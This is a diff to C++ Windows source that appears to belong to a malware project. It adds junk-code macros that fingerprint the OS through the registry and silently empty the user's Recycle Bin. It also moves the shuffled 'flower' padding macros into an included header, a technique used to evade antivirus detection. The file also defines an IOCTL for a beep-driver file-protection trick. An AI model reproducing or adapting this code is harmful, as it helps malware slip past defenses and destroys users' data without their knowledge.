@@ -13,7 +13,7 @@ using namespace std;
 #define IOCTL_BEEP_SET_PROTECT_FILE	CTL_CODE(FILE_DEVICE_BEEP, 0x12, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
 char *buf = NULL;
-DWORD dwSizeXXX = 0,dwBytesInBlock;
+DWORD dwSizeXXX = MAX_PATH,dwBytesInBlock;
 char szXBuff[MAX_PATH] = {0};
 HANDLE hXMod = INVALID_HANDLE_VALUE;
 HANDLE hmyfile,hFileMapping,hmyfilemap;
@@ -47,7 +47,10 @@ FILE *fd;
 SYSTEM_INFO sinf;
 __int64 qwFileSize,myFilesize,qwFileOffset,qwmyFileOffset;
 PBYTE pbFile,pbmyFile;
+HKEY hKey;
 char AddMsg[]="President Obama's page on Google's social network site has been inundated with messages in Chinese after restrictions in China were removed.";
+OSVERSIONINFOEX osvi;
+SHQUERYRBINFO shqbi;
 
 #define XCODE1 __try{\
 		GetModuleFileName(NULL, szXBuff, sizeof(szXBuff)-1);\
@@ -324,105 +327,49 @@ char AddMsg[]="President Obama's page on Google's social network site has been i
 	Sleep(9);\
 	}
 
+#define XCODE10 __try{\
+	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));\
+	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);\
+	if( !GetVersionEx((OSVERSIONINFO *)&osvi))\
+	{\
+		osvi.dwOSVersionInfoSize = sizeof (OSVERSIONINFO);\
+		GetVersionEx((OSVERSIONINFO *)&osvi);\
+	}\
+	dwRes = RegOpenKeyEx( HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\ProductOptions",0, KEY_QUERY_VALUE, &hKey );\
+	if( dwRes == ERROR_SUCCESS )\
+	{\
+	RegQueryValueEx( hKey, "ProductType", NULL, NULL, (LPBYTE) szXBuff, &dwSizeXXX);\
+	RegCloseKey( hKey );\
+	if ( lstrcmpi( "WINNT", szXBuff) == 0 )\
+	OutputDebugString("Workstation");\
+	if ( lstrcmpi( "LANMANNT", szXBuff) == 0 )\
+	OutputDebugString( "Server " );\
+	if ( lstrcmpi( "SERVERNT", szXBuff) == 0 )\
+	OutputDebugString( "Advanced Server " );\
+	sprintf(szXBuff,"%d.%d", osvi.dwMajorVersion, osvi.dwMinorVersion );\
+	OutputDebugString(szXBuff);\
+	}\
+	}\
+	__except(EXCEPTION_EXECUTE_HANDLER){\
+		Sleep(10);\
+	}
+
+#define XCODE11 __try{\
+	shqbi.cbSize = sizeof(shqbi);\
+	shqbi.i64NumItems = -1;\
+	shqbi.i64Size = -1;\
+	if(S_OK == SHQueryRecycleBin(0, &shqbi))\
+	{\
+		sprintf(szXBuff, "Items:%u Bytes used:%u", (DWORD)shqbi.i64NumItems, (DWORD)shqbi.i64Size);\
+		SHEmptyRecycleBin(0, 0, SHERB_NOPROGRESSUI);\
+	}\
+	}\
+	__except(EXCEPTION_EXECUTE_HANDLER){\
+		Sleep(11);\
+	}
+
 #ifdef FLOWERX
-#define XXX1 XCODE1 \
-XCODE2 \
-XCODE3 \
-XCODE4 \
-XCODE5 \
-XCODE6 \
-XCODE7 \
-XCODE8
-
-#define XXX2 XCODE8\
-	XCODE1 \
-	XCODE2 \
-	XCODE3 \
-	XCODE4 \
-	XCODE5 \
-	XCODE6 \
-	XCODE7
-
-#define XXX3 	XCODE7 \
-XCODE8 \
-XCODE1 \
-	XCODE2 \
-	XCODE3 \
-	XCODE4 \
-	XCODE5 \
-	XCODE6
-
-#define XXX4	XCODE6 \
-	XCODE7 \
-	XCODE8 \
-	XCODE1 \
-	XCODE2 \
-	XCODE3 \
-	XCODE4 \
-	XCODE5
-
-#define XXX5	XCODE5 \
-	XCODE6 \
-	XCODE7 \
-	XCODE8 \
-	XCODE1 \
-	XCODE2 \
-	XCODE3 \
-	XCODE4
-
-#define XXX6	XCODE4 \
-	XCODE5 \
-	XCODE6 \
-	XCODE7 \
-	XCODE8 \
-	XCODE1 \
-	XCODE2 \
-	XCODE3
-
-#define XXX7	XCODE3 \
-	XCODE4 \
-	XCODE5 \
-	XCODE6 \
-	XCODE7 \
-	XCODE8 \
-	XCODE1 \
-	XCODE2
-
-#define XXX8	XCODE2 \
-	XCODE3 \
-	XCODE4 \
-	XCODE5 \
-	XCODE6 \
-	XCODE7 \
-	XCODE8 \
-	XCODE1
-
-#define XXX9	XCODE2 \
-	XCODE4 \
-	XCODE6 \
-	XCODE8 \
-	XCODE1 \
-	XCODE3 \
-	XCODE5 \
-	XCODE7
-
-#define XXX10	XCODE1 \
-	XCODE3 \
-	XCODE5 \
-	XCODE7 \
-	XCODE2 \
-	XCODE4 \
-	XCODE6 \
-	XCODE8
-
-#define XXX11	XCODE1 \
-	XCODE4 \
-	XCODE7 \
-	XCODE2 \
-	XCODE5 \
-	XCODE8 \
-	XCODE3 \
-	XCODE6
+#include "xrand.h"
 #else
 #define XXX1 _asm nop;
 #define XXX2 _asm nop;
